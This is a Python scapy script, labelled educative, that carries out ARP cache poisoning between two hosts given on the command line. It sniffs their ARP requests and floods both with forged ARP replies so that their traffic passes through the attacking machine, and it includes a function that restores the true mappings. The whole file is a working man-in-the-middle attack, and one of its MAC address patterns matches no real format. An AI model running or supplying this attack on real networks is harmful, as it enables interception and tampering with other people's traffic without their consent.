import argparse
import ipaddress
import re
import time

from scapy.all import sniff, ARP, sr, Ether, send, sendp, conf

def check_ipv4(ip:str) -> bool:
    try:
        ip_object = ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def check_mac(mac: str) -> bool:
    patterns = [
        r'^([0-9A-Fa-f]{2}-){5}[0-9A-Fa-f]{2}$',   # xx-xx-xx-xx-xx-xx
        r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$',   # xx:xx:xx:xx:xx:xx
        r'^([0-9A-Fa-f]{3}\.){3}[0-9A-Fa-f]{3}$',  # xxx.xxx.xxx.xxx
    ]
    return any(re.fullmatch(p, mac) for p in patterns)

def check_arp(arp, src, target):
    src_ip, src_mac = src
    target_ip, target_mac = target

    if arp.op != 1:
        return False

    if arp.psrc == src_ip and arp.pdst == target_ip:
        return True

    if arp.psrc == target_ip and arp.pdst == src_ip:
        return True

    return False

def restore(src, target):
    send(ARP(
        op=2,
        psrc=src[0],
        hwsrc=src[1],
        pdst=target[0],
        hwdst="ff:ff:ff:ff:ff:ff"),
    count=5)
    send(ARP(
        op=2,
        psrc=target[0],
        hwsrc=target[1],
        pdst=src[0],
        hwdst="ff:ff:ff:ff:ff:ff"),
    count=5)

def handle(pkt):
    if not pkt.haslayer(ARP):
        return
    arp = pkt[ARP]
    print(f"src={src}, target={target}")
    print(f"arp={arp} with op is:{arp.op}///psrc is:{arp.psrc}///hwsrc is:{arp.hwsrc.lower()}///pdst is:{arp.pdst}///hwdst is:{arp.hwdst.lower()}")

    if check_arp(arp, src, target):
        print(f"poison attack !!! src is {arp.psrc} and target is {arp.pdst}")
        pkt = Ether(dst=arp.hwsrc) / ARP(
            op=2,
            hwsrc=None,  # scapy autofill
            psrc=arp.pdst,
            pdst=arp.psrc,
            hwdst=arp.hwsrc
        )
        pkt.show2()
        if arp.psrc == src[0]:
            mac_send = target[1]
        else:
            mac_send = src[1]

        pkt2 = Ether(dst=mac_send) / ARP(
            op=2,
            hwsrc=None,  # scapy autofill
            psrc=arp.psrc,
            pdst=arp.pdst,
            hwdst=mac_send
        )
        pkt2.show()
        while(is_running):
            try:
                sendp(pkt, count=5, verbose=False)
                sendp(pkt2, count=5, verbose=False)
            except KeyboardInterrupt:
                restore(src, target)
                exit(1)
            else:
                time.sleep(2)

#--------------------argparse--------------------
parser = argparse.ArgumentParser(description="educative program about ARP poisoning")
parser.add_argument("IP-src", help="ip v4 address of the source")
parser.add_argument("MAC-src", help="MAC address of the source")
parser.add_argument("IP-target", help="ip v4 address of the target")
parser.add_argument("MAC-target", help="MAC address of the target")
args = parser.parse_args()
#--------------------checker--------------------
src = (getattr(args, "IP-src").strip(), getattr(args, "MAC-src").strip().lower())
target = (getattr(args, "IP-target").strip(), getattr(args, "MAC-target").strip().lower())

if not check_ipv4(src[0]) or not check_ipv4(target[0]) or not check_mac(src[1]) or not check_mac(target[1]):
    print("Wrong format for IP or MAC address")
    exit(1)

is_running = True
sniff(filter="arp", prn=handle, store=False)

